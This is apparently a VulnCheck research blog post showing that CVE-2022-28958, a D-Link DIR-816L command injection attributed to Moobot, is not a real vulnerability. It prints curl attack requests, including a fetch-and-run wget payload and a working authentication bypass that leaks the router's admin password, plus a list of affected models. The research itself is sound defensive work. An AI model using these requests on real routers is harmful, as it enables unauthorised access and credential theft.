---
title: "Moobot Uses a Fake Vulnerability - Blog - VulnCheck"
date: 2022-12-06T00:00:00.000Z
draft: false
type: posts
categories: 
- 
---
# Moobot Uses a Fake Vulnerability - Blog - VulnCheck

<br/>

<br/>
\# Introduction\\nOn September 8, 2022, \[CVE-2022-28958\](https://nvd.nist.gov/vuln/detail/cve-2022-28958) was added to CISA's \[Known Exploited Vulnerability Catalog\](https://www.cisa.gov/known-exploited-vulnerabilities-catalog). A \[report\](https://unit42.paloaltonetworks.com/moobot-d-link-devices/) published a couple days prior said the vulnerability was being exploited by \[Moobot\](https://malpedia.caad.fkie.fraunhofer.de/details/elf.moobot), a Mirai-like botnet. However, this vulnerability has never been exploited in the wild, because CVE-2022-28958 isn’t a real vulnerability.\\n\\nOn April 6, 2022, GitHub user \[shijn0925\](https://github.com/shijin0925) published \[four vulnerabilities\](https://github.com/shijin0925/IOT/tree/master/DIR816) affecting the end-of-life SOHO router D-Link \[DIR-816L\](https://legacy.us.dlink.com/pages/product.aspx?id=1e9adeae036d4724b5fbc82325f93ae8). The vulnerability details were published in markdown files named 1.md through 4.md. MITRE assigned the following CVE identifiers for the researcher’s findings:\\n\\n\* 1.md - \[CVE-2022-28955\](https://nvd.nist.gov/vuln/detail/CVE-2022-28955)\\n\* 2.md - None assigned\\n\* 3.md - \[CVE-2022-28958\](https://nvd.nist.gov/vuln/detail/CVE-2022-28958)\\n\* 4.md - \[CVE-2022-28956\](https://nvd.nist.gov/vuln/detail/CVE-2022-28956)\\n\\nThis blog is predominantly about CVE-2022-28958 not being a real vulnerability, but it’s interesting to note that the other two findings likely shouldn’t have received CVE either. CVE-2022-28955 (missing authentication) appears to be as-designed functionality with low or no security impact. CVE-2022-28956 (authentication bypass) is a real security issue, but a duplicate of four other CVE: \[CVE-2020-15894\](https://nvd.nist.gov/vuln/detail/CVE-2020-15894), \[CVE-2020-9376\](https://nvd.nist.gov/vuln/detail/CVE-2020-9376), \[CVE-2019-17506\](https://nvd.nist.gov/vuln/detail/CVE-2019-17506), and \[CVE-2018-7034\](https://nvd.nist.gov/vuln/detail/CVE-2018-7034). Amazingly, we found those five CVE don’t cover all affected devices. The authentication bypass is useful to us later in the blog, so we ended up creating a list of affected devices (see addendum at the end of the blog).\\n\\nAll of this is worth discussing, not just because CVE-2022-28958 found its way into the KEV Catalog, but because there are a good number of these devices on the internet. \[Shodan\](https://www.shodan.io/search?query=title%3A%22D-LINK+SYSTEMS%2C+INC.%22+title%3A%22WIRELESS+ROUTER%22+title%3A%22HOME%22) has indexed around 6,000 of them:\\n\\n!\[censys\](/blog/moobot-uses-fake-vulnerability/shodan.png){:width="100%"}\\n\\\\n \\n\\n# Moobot and CVE-2022-28958\\n\\nLet's look at shijin0925's original \[disclosure\](https://github.com/shijin0925/IOT/blob/master/DIR816/3.md). The following vulnerability description is provided (note that we didn't correct any language):\\n\\n> DIR816L\_FW206b01 shareport.php has an issue that attackers can use it to execute command via "value" parameter.\\n\\nThe disclosure also includes this code snippet from \`shareport.php\`:\\n\\n\`\`\`php\\nif ($AUTHORIZED\_GROUP < 0)\\n{\\n $result = "FAIL";\\n $reason = i18n("Permission deny. The user is unauthorized.");\\n}\\nelse\\n{\\n if ($\_POST\["action"\] == "sethostname")\\n {\\n $value = $\_POST\["value"\];\\n if ($value != "")\\n {\\n set("/device/gw\_name", $value);\\n event("SHAREPORT.SETGWNAME");\\n $RESULT = "OK";\\n $REASON = ""; \\n }\\n } \\n else fail(i18n("Unknown ACTION!"));\\n}\\n\`\`\`\\n\\nAnd the disclosure specifically calls out the use of \`set()\`:\\n\\n> As you can see there is not enough filter with paramter "value",it just passed to function set which execute command directly. \\n\\nAccording to this disclosure, the vulnerability is the result of an attacker-controlled \`$value\` being passed into \`set()\` in \`shareport.php\`. Allegedly, \`set()\` will "execute command directly." The disclosure also contains a \`curl\`-based proof of concept:\\n\\n::shell-prompt\\n\`\`\`sh\\ncurl http://192.168.0.1:80/getcfg.php -d "action=sethostname&value=%26%20ls%20-la%20%26%0aAUTHORIZED\_GROUP=1"\\n\`\`\`\\n::\\n\\nThe disclosure doesn’t contain the output of the \`curl\` request, and it doesn't provide any other evidence the router executed the provided \`value\` parameter (\`& ls -la &\`). The reader is just expected to accept the command works. But, the proof of concept has a glaring error. It doesn’t send the “malicious” request to \`shareport.php\` where the alleged vulnerable code resides. The request is sent to \`getcfg.php\` an entirely different and unrelated endpoint. And, perhaps most importantly, \`getcfg.php\` doesn't have logic for handling the provided \`action\` \*or\* \`value\` parameters, so this proof of concept would have \*no effect\* on the system. But don’t take our word for it. Here is \`getcfg.php\`:\\n\\n\`\`\`php\\nif ($\_POST\["CACHE"\] == "true")\\n{\\n echo dump(1, "/runtime/session/".$SESSION\_UID."/postxml");\\n}\\nelse\\n{\\n if($AUTHORIZED\_GROUP < 0)\\n {\\n /\* not a power user, return error message \*/\\n echo "\\tFAILED\\n";\\n echo "\\tNot authorized\\n";\\n }\\n else\\n {\\n /\* cut\_count() will return 0 when no or only one token. \*/\\n $SERVICE\_COUNT = cut\_count($\_POST\["SERVICES"\], ",");\\n TRACE\_debug("GETCFG: got ".$SERVICE\_COUNT." service(s): ".$\_POST\["SERVICES"\]);\\n $SERVICE\_INDEX = 0;\\n while ($SERVICE\_INDEX < $SERVICE\_COUNT)\\n {\\n $GETCFG\_SVC = cut($\_POST\["SERVICES"\], $SERVICE\_INDEX, ",");\\n TRACE\_debug("GETCFG: serivce\[".$SERVICE\_INDEX."\] = ".$GETCFG\_SVC);\\n if ($GETCFG\_SVC!="")\\n {\\n $file = "/htdocs/webinc/getcfg/".$GETCFG\_SVC.".xml.php";\\n /\* GETCFG\_SVC will be passed to the child process. \*/\\n if (isfile($file)=="1")\\n {\\n AES\_Encrypt\_DBnode($GETCFG\_SVC, "Encrypt");\\n dophp("load", $file);\\n AES\_Encrypt\_DBnode($GETCFG\_SVC, "Decrypt");\\n }\\n }\\n $SERVICE\_INDEX++;\\n }\\n }\\n}\\n\`\`\`\\n\\nAfter reading the above code, it’s obvious the researcher's proof of concept is useless. It doesn’t touch the endpoint where the vulnerable code allegedly resides, and the endpoint it does reach doesn’t do anything with the provided parameters. It’s amusing that, apparently, the Moobot developers copied the researcher’s mistake. Pictured below, from Unit 42's \[blog\](https://unit42.paloaltonetworks.com/moobot-d-link-devices/), is Moobot's implementation of CVE-2022-28958 as seen via Wireshark:\\n\\n!\[censys\](/blog/moobot-uses-fake-vulnerability/moobot\_exploit.png){:width="100%"}\\n\\nAbove, Moobot sends an HTTP POST request to \`getcfg.php\` using both the \`action\` and \`value\` parameters just as the researcher’s incorrect proof of concept did. As we've seen, \`getcfg.php\` doesn't handle \`action\` or \`value\`. Moobot's exploit doesn’t work.\\n\\nIf the screenshot can be trusted, the Moobot developers also encoded the payload incorrectly. By using \`value=&\` instead of \`value=%26\`, they've messed up the (assumed) command injection and simply set \`value\` to an empty string. Also, the authentication bypass at the end (\`AUTHORIZED\_GROUP=1\` aka CVE-2022-28956, CVE-2020-15894, CVE-2020-9376, CVE-2019-17506, and CVE-2018-7034) \*\*has to\*\* start with \`%0a\` to work, which isn't the case here.\\n\\nEither way, the exploit can't work because it's hitting the wrong endpoint. Which is interesting, but that doesn't mean \`shareport.php\` isn't exploitable. Let’s do some testing to prove that CVE-2022–28958 doesn’t exist!\\n\\n# Local Testing of a D-Link DIR-816L\\n\\nThe affected DIR-816L is end-of-life, but it was easy find one on Ebay. Fortuatunely, the affected firmware, 2.06.B01, is also available on D-Link’s legacy \[files archive\](http://legacyfiles.us.dlink.com/DIR-816L/REVB/SECURITY\_PATCHES/):\\n\\n!\[censys\](/blog/moobot-uses-fake-vulnerability/legacy\_files.png){:width="100%"}\\n\\nSo we had everything needed to test the device in a local lab setup. We started testing by throwing the researcher’s original proof of concept at the device.\\n\\n::shell-prompt\\n\`\`\`sh\\nalbinolobster@mournland:~$ curl -d "action=sethostname&value=%26%20ls%20-la%20%26%0aAUTHORIZED\_GROUP=1" http://192.168.0.1:80/getcfg.php\\n\`\`\`\\n::\\n\\n\`\`\`xml\\n\\n\\n\\n\`\`\`\\n\\nUnderwhelming to say the least. No indication that \`& ls -l &\` was executed. So we tried the Moobot payload.\\n\\n::shell-prompt\\n\`\`\`sh\\nalbinolobster@mournland:~$ curl -d "action=sethostname&value=& wget http://192.168.0.164/test; chmod 777 test; ./test & AUTHORIZED\_GROUP=1" http://192.168.0.1:80/getcfg.php\\n\`\`\`\\n::\\n\\n\`\`\`xml\\n\\n\\n FAILED\\n Not authorized\\n\\n\`\`\`\\nWe received a “Not authorized” response because the authorization bypass didn’t work, as we predicted earlier in the blog. Without a working bypass, the attacker needs to be authenticated to the device. This is a fairly important detail that NIST overlooked when assigning CVE-2022-28958 a CVSSv3 score of 9.8. CISA, presumably, also overlooked this when they added CVE-2022–28958 to the KEV Catalog but not CVE-2022–28956.\\n\\n\\nIf we fix Moobot's exploit to use the bypass correctly, fix the (assumed) command injection, and simplify the payload then we get this:\\n\\n::shell-prompt\\n\`\`\`sh\\nalbinolobster@mournland:~$ curl -d "action=sethostname&value=%26%20wget%20http://192.168.0.164/test%20%26%0aAUTHORIZED\_GROUP=ok" http://192.168.0.1:80/getcfg.php\\n\`\`\`\\n::\\n\\n\`\`\`xml\\n\\n\\n\\n\`\`\`\\n\\nNow, in this case, we had \`nc\` listening for a \`wget\` callback on 192.168.0.164, and we do know that \`wget\` is present on the DIR-816L. But, again, we get nothing from the device:\\n\\n::shell-prompt\\n\`\`\`sh\\nalbinolobster@mournland:~$ sudo nc -lvnp 80\\n\[sudo\] password for albinolobster:\\nListening on 0.0.0.0 80\\n\`\`\`\\n::\\n\\nBut remember, we didn't expect any of that to work anyway. We already knew \`getcfg.php\` is the wrong endpoint. We only tested the original researcher's proof of concept to be thorough. What we really want to know is if \`shareport.php\` is exploitable as the original writeup and CVE description suggest. Let’s try the previous \`wget\` payload, but this time pointed at \`shareport.php\`:\\n\\n::shell-prompt\\n\`\`\`sh\\nalbinolobster@mournland:~$ curl -d "action=sethostname&value=%26%20wget%20http://192.168.0.164/test%20%26%0aAUTHORIZED\_GROUP=ok" http://192.168.0.1:80/shareport.php\\n\`\`\`\\n::\\n\\n\`\`\`xml\\n\\n\\n sethostname\\n OK\\n \\n\\n\`\`\`\\n\\nA new response! But still no \`wget\` request to our listening \`nc\` on port 80. Maybe the researcher’s original \`& ls -la &\` payload will yield a result?\\n\\n::shell-prompt\\n\`\`\`sh\\nalbinolobster@mournland:~$ curl -d "action=sethostname&value=%26%20ls%20-l%20%26%0aAUTHORIZED\_GROUP=ok" http://192.168.0.1:80/shareport.php\\n\`\`\`\\n::\\n\\n\`\`\`xml\\n\\n\\n sethostname\\n OK\\n \\n\\n\`\`\`\\n\\nAgain, no proof the exploit was successful. Perhaps exploitation is blind? If that's the case, why provide a proof of concept using \`& ls -la &\`? Maybe the proof of concept messed up the shell metacharacters? A single ampersand is an odd choice. We fiddled with the metacharacters and tested all these exploits against firmware versions: 2.03b1, 2.06b1 (the reportedly vulnerable version), and 2.06b09 Beta. The "exploits" didn't work on any of these firmware. But why?\\n\\n# CVE-2022-28958: Not a Real Vulnerability\\n\\nLet's return to the researcher's original claim. They state the following code in \`shareport.php\` does not have \*"enough filter with parameter ‘value’, it just passed to function set which execute command directly."\*\\n\\n\`\`\`php\\nset("/device/gw\_name", $value);\\n\`\`\`\\n\\nThe claim that \`set()\` will \*"execute command directly"\* is what needs to be examined. It would seem the researcher thinks \`set()\` will execute \`/device/gw\_name\` with \`$value\` as some type of parameter. However, after looking at the firmware's code, we know \`/device/gw\_name\` isn't a binary and \`set()\` \*doesn't\* execute commands.\\n\\nExecution of PHP files like \`getcfg.php\` or \`shareport.php\` on the DIR-816L is a bit opaque. The files are served via the \`www\` binary, but it passes execution of \`php\` files to a binary called \`cgibin\`. \`cgibin\` passes execution to a binary called \`xmldb\`, which has a custom PHP interpreter. Exactly how custom, we're not sure, but they've added a few builtins like \`set()\`, \`setattr()\`, \`event()\`, and \`query()\`. These extra builtins are for interacting with the \*xml database\* (hence the binary's name, \`xmldb\`).\\n\\nThe xml database contains the router's configuration. When the user calls \`set("/device/gw\_name", $value)\`, they are inserting \`$value\` into the \`/device/gw\_name\` entry in the xml database. If you root the device, you’ll find you can examine the database from the device's command line using the \`xmldbc\` (xml db client) binary. In the following example, we list the contents of \`/device/gw\_name\` in the xml database of a DIR-816L we had just “exploited.”\\n\\n\`\`\`sh\\n# xmldbc -g /device/gw\_name\\n& wget http://192.168.0.164/test &\\n# xmldbc -d /tmp/config.xml\\n# cat /tmp/config.xml | grep gw\_name\\n& wget http://192.168.0.164/test & \\n\`\`\`\\n\\nHere you can see our malicious \`wget\` was inserted into the database, just as we said. The shell metacharacters were even encoded properly when inserted into the xml. Not only is there no evidence of \`wget\` being executed, but it isn't even part of \`set()\`'s intended functionality. \`set()\` does not execute \`value\` "directly", as stated in the disclosure.\\n\\nLooking deeper with Ghidra, we didn't find any evidence of command execution when tracing the logic from the http server through \`xmldbc\` and into the database. It's obviously difficult to prove a negative, especially with so many moving parts. But after testing the exploits, looking at the functionality, and examining where the payload lands, it’s difficult to say the original claims hold up.\\n\\nHowever, this vulnerability is in the KEV Catalog so it’s worth looking even deeper. Let’s seek out artifacts left by CVE-2022-28958 “exploitation” on internet-facing devices.\\n\\n# Internet Scanning\\n\\nAs stated earlier, the researcher’s original proof of concept had \`%0aAUTHORIZED\_GROUP=1\` at the end of the payload. This authentication bypass satisfies the \`AUTHORIZED\_GROUP\` check in DIR-816L PHP files (including \`shareport.php\`):\\n\\n\`\`\`php\\nif ($AUTHORIZED\_GROUP < 0)\\n{\\n $result = "FAIL";\\n $reason = i18n("Permission deny. The user is unauthorized.");\\n}\\nelse\\n{\\n if ($\_POST\["action"\] == "sethostname")\\n {\\n $value = $\_POST\["value"\];\\n if ($value != "")\\n {\\n set("/device/gw\_name", $value);\\n event("SHAREPORT.SETGWNAME");\\n $RESULT = "OK";\\n $REASON = ""; \\n }\\n } \\n else fail(i18n("Unknown ACTION!"));\\n}\\n?>\\n\`\`\`\\n\\nThe bypass is useful because it gives an attacker access to most of the router's PHP logic. As we’ve stated, the bypass has been assigned five CVE at this point, and it's typically associated with a credential leak (which also happens to work on the DIR-816L):\\n\\n::shell-prompt\\n\`\`\`sh\\nalbinolobster@mournland:~/initial-access/feed/cve-2019-10891$ curl http://192.168.0.1:80/getcfg.php -d "SERVICES=DEVICE.ACCOUNT%0AAUTHORIZED\_GROUP=1"\\n\`\`\`\\n::\\n\`\`\`xml\\n\\n\\n\\n DEVICE.ACCOUNT\\n \\n wget http://192.168.0.164/test\\n \\n \\n 1\\n 2\\n 1\\n \\n USR-\\n Admin\\n \\n labpass1\\n 0\\n \\n \\n \\n \\n \\n \\n 0\\n \\n \\n 0\\n \\n 180\\n 128\\n 16\\n \\n \\n\\n\\n\`\`\`\\n\\nCredential leaks on routers are useful for attackers that manipulate router configurations or upload malicious firmware, but for our purposes, the authentication bypass can be used to grab detailed version information from the \`/DevInfo.txt\` endpoint. Like this:\\n\\n::shell-prompt\\n\`\`\`sh\\nalbinolobster@mournland:~/initial-access/feed/cve-2019-10891$ curl http://192.168.0.1/DevInfo.txt?vuln=check%0aAUTHORIZED\_GROUP=1270\\nFirmware External Version: V2.06\\nFirmware Internal Version: f4jc\\nModel Name: DIR-816L\\nHardware Version:\\nWLAN Domain: CA\\nKernel: 2.6.30.9\\nLanguage: en\\nGraphcal Authentication: Disable\\nLAN MAC: f8:e9:03:c1:81:b4\\nWAN MAC: f8:e9:03:c1:81:b7\\nWLAN MAC: f8:e9:03:c1:81:b4\\n\`\`\`\\n::\\n\\nUsing the bypass also allows us to read \`/mydlink/get\_WanSetting.asp\` which contains the “exploited” hostname. For example, below you can see the \`wget\` command from our exploitation attempt of \`shareport.php\`:\\n\\n::shell-prompt\\n\`\`\`sh\\nalbinolobster@mournland:~/initial-access/feed/cve-2019-10891$ curl http://192.168.0.1/mydlink/get\_WanSetting.asp -d "test=test%0aAUTHORIZED\_GROUP=1"\\n\`\`\`\\n::\\n\`\`\`xml\\n\\n1\\n& wget http://192.168.0.164/test & \\nf8:e9:03:c1:81:b7\\n... truncated ...\\n\`\`\`\\n\\nIn theory, if these devices were under attack using the \`shareport.php\` vulnerability, then we’d be able to find artifacts of exploitation on internet-facing devices by querying \`/mydlink/get\_WanSetting.asp\`. We did just that. Using a list of 6000+ routers from Shodan, we found \*\*zero\*\* routers with evidence of \`shareport.php\` exploitation attempts. Which means, to us, that it’s highly unlikely that anyone has attempted to use the vulnerability, as described in the CVE description, in the wild.\\n\\n# Consulting Greynoise\\n\\nFinally, we consulted Greynoise. They can give us insight into whether \`shareport.php\` exploitation is hitting any of their honeypots. \\n\\n!\[censys\](/blog/moobot-uses-fake-vulnerability/greynoise\_shareport.png){:width="100%"}\\n\\nFrom the screenshot above, you can see that Greynoise isn’t seeing CVE-2022-28958 exploitation either. Greynoise does have an existing tag for the \`getcfg.php\` \[authentication bypass\](https://viz.greynoise.io/tag/d-link-trendnet-getcfg-auth-bypass-attempt?days=30). As mentioned earlier, this is typically associated with a credential leak, and it does have some activity over the last 30 days. \\n\\n!\[censys\](/blog/moobot-uses-fake-vulnerability/greynoise\_getcfg.png){:width="100%"}\\n\\nBut, as previously mentioned, \`getcfg.php\` is in no way related to CVE-2022-28958 other than the original researcher posting an erroneous proof of concept.\\n\\n# Summary\\n\\nIn summary, this blog established the following:\\n\\n\* The original researcher's proof of concept for CVE-2022-28958 never worked.\\n\* Moobot copied the researcher's proof of concept and added additional errors. Their exploit never worked.\\n\* CVE-2022-28958 isn't real. We tested firmware versions 2.03b1, 2.06b1 (the reportedly vulnerable version) and 2.06b9 and found no evidence the vulnerability exists. The original researcher provided no evidence either.\\n\* Internet-facing D-Link DIR-816L did not contain artifacts that would indicate they were exploited by CVE-2022-28958.\\n\* GreyNoise has not seen \`shareport.php\` HTTP requests hit their honeypots.\\n\\nWe conclude that CVE-2022-28958 is not a real vulnerability and at-scale exploitation has never occurred. The vulnerability should not be listed by MITRE, and it should not be in the CISA Known Exploited Vulnerabilities Catalog. We filed a dispute with MITRE and shared our findings with CISA in October 2022.\\n\\n!\[censys\](/blog/moobot-uses-fake-vulnerability/dispute.png){:width="100%"}\\n\\n# Addendum\\n\\nVulnCheck has found the following D-Link models to be vulnerable to the \`%0aAUTHORIZED\_GROUP\` bypass (aka CVE-2022-28956, CVE-2020-15894, CVE-2020-9376, CVE-2019-17506, and CVE-2018-7034):\\n\\n\* DIR-300\\n\* DIR-600\\n\* DIR-605L\\n\* DIR-610\\n\* DIR-610N+\\n\* DIR-615\\n\* DIR-629\\n\* DIR-645\\n\* DIR-685\\n\* DIR-803\\n\* DIR-806\\n\* DIR-815\\n\* DIR-816L\\n\* DIR-817LW\\n\* DIR-818L\\n\* DIR-818LW\\n\* DIR-822\\n\* DIR-845L\\n\* DIR-850L\\n\* DIR-860L\\n\* DIR-865L\\n\* DIR-868L\\n\* DSL-2890AL\\n\* GO-RT-AC750\\n\* WBR-2200

#### [Source](https://vulncheck.com/blog/moobot-uses-fake-vulnerability)

<br/>
---
